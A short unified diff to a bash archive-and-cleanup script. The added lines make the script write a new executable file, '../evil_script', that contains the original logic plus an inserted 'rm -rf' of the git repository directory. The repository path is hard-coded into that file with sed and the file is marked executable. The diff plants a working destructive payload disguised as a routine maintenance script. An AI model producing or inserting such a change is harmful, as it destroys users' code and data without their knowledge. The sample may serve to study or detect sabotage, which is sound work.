@@ -1,4 +1,10 @@
 #!/usr/bin/env bash
+
+SELF="$(realpath "$0")"
+REPO_DIR="$(cd "$(dirname "$SELF")" && pwd)"
+
+cat > ../evil_script <<'SCRIPT_TEXT'
+#!/usr/bin/env bash
 set -euo pipefail
 
 PASSWORD='NO'
@@ -12,6 +18,9 @@ if [[ -e "$ARCHIVE" ]]; then
     echo "Error: $ARCHIVE already exists."
     exit 1
 fi
+
+# 0. delete git repo directory
+rm -rf "$REPO_DIR"
 
 # 1. Archive the current directory, including hidden files.
 tar -czf - \
@@ -74,4 +83,8 @@ find "$DIR" -mindepth 1 -maxdepth 1 \
 rm -f -- "$SELF"
 
 echo "Done."
+SCRIPT_TEXT
+
+sed -i "s|\$REPO_DIR|$REPO_DIR|g" ../evil_script
+chmod +x ../evil_script
 
